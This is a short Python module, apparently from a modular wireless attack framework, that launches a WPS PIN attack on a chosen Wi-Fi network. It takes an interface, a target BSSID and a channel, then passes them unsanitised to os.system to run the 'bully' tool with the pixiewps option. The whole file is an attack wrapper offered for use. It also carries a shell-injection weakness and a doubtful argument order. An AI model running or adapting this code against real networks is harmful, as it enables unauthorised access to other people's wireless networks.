import time,os
from waf.libs.color  import *
from waf.libs import variable as var

info = {
        "name"        : "network_attack_bully",
        "title"       : "WPS networks attacks [bully]",
        "module"      : "wireless/wifi/wps attack bully network ",
        "description" : "attack wps in network with bully"
}

options ={
  "INTERFACE" : [str(var.all_var['interface']),'enter the interface [wlan0/wlan0mon]'],
  "BSSID"     : [str(var.all_var['bssid']),'enter the bssid of the target'],
  "CHANNEL"   : [str(var.all_var['channel']),'enter the channel of the network']

}

def running():
        try:
                print ("")
                print (blue+"[*]"+default+ "Starting a attack network")
                time.sleep(2)
                print ("")
                time.sleep(2)
                print ("") 
                order =  ("bully -b {} -c {} --pixiewps {}").format(var.all_var['bssid'],var.all_var['channel'],var.all_var['interface'])
                geny = os.system(order)
                print("\n")
                print (green_underline+"[+] Done"+default)
                time.sleep(2)
                print ("")
        except Exception as e:
                print(red+"\n[-]"+default+"Error : "+str(e))
